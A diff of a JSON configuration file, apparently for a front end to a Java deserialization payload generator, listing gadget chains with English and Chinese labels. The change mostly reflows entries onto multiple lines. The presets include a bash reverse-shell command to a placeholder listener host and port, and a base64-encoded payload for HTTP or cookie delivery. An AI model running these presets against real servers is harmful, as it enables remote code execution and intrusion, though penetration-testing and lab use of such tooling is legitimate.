@@ -31,19 +31,71 @@
         "description": "Gadget chain to use",
         "descriptionI18n": { "zh": "选择要使用的 gadget 链" },
         "options": [
-          { "value": "CommonsCollections1", "label": "CommonsCollections1 (commons-collections 3.1)", "labelI18n": { "zh": "CommonsCollections1（commons-collections 3.1）" } },
-          { "value": "CommonsCollections2", "label": "CommonsCollections2 (commons-collections4 4.0)", "labelI18n": { "zh": "CommonsCollections2（commons-collections4 4.0）" } },
-          { "value": "CommonsCollections3", "label": "CommonsCollections3", "labelI18n": { "zh": "CommonsCollections3" } },
-          { "value": "CommonsCollections4", "label": "CommonsCollections4", "labelI18n": { "zh": "CommonsCollections4" } },
-          { "value": "CommonsCollections5", "label": "CommonsCollections5", "labelI18n": { "zh": "CommonsCollections5" } },
-          { "value": "CommonsCollections6", "label": "CommonsCollections6 (TransformedMap-free)", "labelI18n": { "zh": "CommonsCollections6（绕过 TransformedMap 限制）" } },
-          { "value": "CommonsCollections7", "label": "CommonsCollections7 (Hashtable)", "labelI18n": { "zh": "CommonsCollections7（基于 Hashtable）" } },
-          { "value": "CommonsBeanutils1", "label": "CommonsBeanutils1", "labelI18n": { "zh": "CommonsBeanutils1" } },
-          { "value": "JRE8u20", "label": "JRE8u20 (Oracle JRE up to 8u20)", "labelI18n": { "zh": "JRE8u20（Oracle JRE 8u20 及以下）" } },
-          { "value": "Jdk7u21", "label": "Jdk7u21 (Oracle JRE 7u21)", "labelI18n": { "zh": "Jdk7u21（Oracle JRE 7u21）" } },
-          { "value": "ROME", "label": "ROME (Spring/JBoss legacy)", "labelI18n": { "zh": "ROME（旧版 Spring / JBoss）" } },
-          { "value": "Spring1", "label": "Spring1 (Spring up to 4.2)", "labelI18n": { "zh": "Spring1（Spring 4.2 及以下）" } },
-          { "value": "Spring2", "label": "Spring2 (later Spring)", "labelI18n": { "zh": "Spring2（较新版 Spring）" } },
+          {
+            "value": "CommonsCollections1",
+            "label": "CommonsCollections1 (commons-collections 3.1)",
+            "labelI18n": { "zh": "CommonsCollections1（commons-collections 3.1）" }
+          },
+          {
+            "value": "CommonsCollections2",
+            "label": "CommonsCollections2 (commons-collections4 4.0)",
+            "labelI18n": { "zh": "CommonsCollections2（commons-collections4 4.0）" }
+          },
+          {
+            "value": "CommonsCollections3",
+            "label": "CommonsCollections3",
+            "labelI18n": { "zh": "CommonsCollections3" }
+          },
+          {
+            "value": "CommonsCollections4",
+            "label": "CommonsCollections4",
+            "labelI18n": { "zh": "CommonsCollections4" }
+          },
+          {
+            "value": "CommonsCollections5",
+            "label": "CommonsCollections5",
+            "labelI18n": { "zh": "CommonsCollections5" }
+          },
+          {
+            "value": "CommonsCollections6",
+            "label": "CommonsCollections6 (TransformedMap-free)",
+            "labelI18n": { "zh": "CommonsCollections6（绕过 TransformedMap 限制）" }
+          },
+          {
+            "value": "CommonsCollections7",
+            "label": "CommonsCollections7 (Hashtable)",
+            "labelI18n": { "zh": "CommonsCollections7（基于 Hashtable）" }
+          },
+          {
+            "value": "CommonsBeanutils1",
+            "label": "CommonsBeanutils1",
+            "labelI18n": { "zh": "CommonsBeanutils1" }
+          },
+          {
+            "value": "JRE8u20",
+            "label": "JRE8u20 (Oracle JRE up to 8u20)",
+            "labelI18n": { "zh": "JRE8u20（Oracle JRE 8u20 及以下）" }
+          },
+          {
+            "value": "Jdk7u21",
+            "label": "Jdk7u21 (Oracle JRE 7u21)",
+            "labelI18n": { "zh": "Jdk7u21（Oracle JRE 7u21）" }
+          },
+          {
+            "value": "ROME",
+            "label": "ROME (Spring/JBoss legacy)",
+            "labelI18n": { "zh": "ROME（旧版 Spring / JBoss）" }
+          },
+          {
+            "value": "Spring1",
+            "label": "Spring1 (Spring up to 4.2)",
+            "labelI18n": { "zh": "Spring1（Spring 4.2 及以下）" }
+          },
+          {
+            "value": "Spring2",
+            "label": "Spring2 (later Spring)",
+            "labelI18n": { "zh": "Spring2（较新版 Spring）" }
+          },
           { "value": "Hibernate1", "label": "Hibernate1", "labelI18n": { "zh": "Hibernate1" } },
           { "value": "Hibernate2", "label": "Hibernate2", "labelI18n": { "zh": "Hibernate2" } },
           { "value": "BeanShell1", "label": "BeanShell1", "labelI18n": { "zh": "BeanShell1" } },
@@ -51,11 +103,31 @@
           { "value": "Clojure", "label": "Clojure", "labelI18n": { "zh": "Clojure" } },
           { "value": "JSON1", "label": "JSON1", "labelI18n": { "zh": "JSON1" } },
           { "value": "Vaadin1", "label": "Vaadin1", "labelI18n": { "zh": "Vaadin1" } },
-          { "value": "MozillaRhino1", "label": "MozillaRhino1", "labelI18n": { "zh": "MozillaRhino1" } },
-          { "value": "MozillaRhino2", "label": "MozillaRhino2", "labelI18n": { "zh": "MozillaRhino2" } },
-          { "value": "FileUpload1", "label": "FileUpload1 (commons-fileupload)", "labelI18n": { "zh": "FileUpload1（commons-fileupload）" } },
-          { "value": "JBossInterceptors1", "label": "JBossInterceptors1", "labelI18n": { "zh": "JBossInterceptors1" } },
-          { "value": "JavassistWeld1", "label": "JavassistWeld1", "labelI18n": { "zh": "JavassistWeld1" } }
+          {
+            "value": "MozillaRhino1",
+            "label": "MozillaRhino1",
+            "labelI18n": { "zh": "MozillaRhino1" }
+          },
+          {
+            "value": "MozillaRhino2",
+            "label": "MozillaRhino2",
+            "labelI18n": { "zh": "MozillaRhino2" }
+          },
+          {
+            "value": "FileUpload1",
+            "label": "FileUpload1 (commons-fileupload)",
+            "labelI18n": { "zh": "FileUpload1（commons-fileupload）" }
+          },
+          {
+            "value": "JBossInterceptors1",
+            "label": "JBossInterceptors1",
+            "labelI18n": { "zh": "JBossInterceptors1" }
+          },
+          {
+            "value": "JavassistWeld1",
+            "label": "JavassistWeld1",
+            "labelI18n": { "zh": "JavassistWeld1" }
+          }
         ]
       },
       {
@@ -86,7 +158,9 @@
         "name": "CommonsCollections1 -> calc.exe (Windows demo)",
         "nameI18n": { "zh": "CommonsCollections1 → calc.exe（Windows 演示）" },
         "description": "Classic Apache commons-collections 3.1 chain popping calc.exe; useful for quick lab demos",
-        "descriptionI18n": { "zh": "经典 Apache commons-collections 3.1 链弹出 calc.exe；适合实验环境快速演示" },
+        "descriptionI18n": {
+          "zh": "经典 Apache commons-collections 3.1 链弹出 calc.exe；适合实验环境快速演示"
+        },
         "args": "CommonsCollections1 \"calc.exe\"",
         "tags": ["demo", "windows"],
         "tagsI18n": { "zh": ["演示", "Windows"] }
@@ -96,7 +170,9 @@
         "name": "CommonsCollections6 -> bash reverse shell",
         "nameI18n": { "zh": "CommonsCollections6 → Bash 反向 Shell" },
         "description": "TransformedMap-free chain that often survives partial commons-collections patches",
-        "descriptionI18n": { "zh": "不依赖 TransformedMap 的链，常可绕过部分 commons-collections 补丁" },
+        "descriptionI18n": {
+          "zh": "不依赖 TransformedMap 的链，常可绕过部分 commons-collections 补丁"
+        },
         "args": "CommonsCollections6 \"bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'\"",
         "tags": ["reverse-shell", "linux"],
         "tagsI18n": { "zh": ["反向 Shell", "Linux"] }
@@ -106,7 +182,9 @@
         "name": "CommonsCollections6 payload, base64 for HTTP",
         "nameI18n": { "zh": "CommonsCollections6 payload + Base64（用于 HTTP 传输）" },
         "description": "Generate a CC6 payload and pipe through base64 for transport in HTTP body / Cookie",
-        "descriptionI18n": { "zh": "生成 CC6 payload 并 base64 编码，便于放入 HTTP body / Cookie 传输" },
+        "descriptionI18n": {
+          "zh": "生成 CC6 payload 并 base64 编码，便于放入 HTTP body / Cookie 传输"
+        },
         "args": "CommonsCollections6 \"{{command}}\" | base64",
         "tags": ["http", "encode"],
         "tagsI18n": { "zh": ["HTTP", "编码"] }
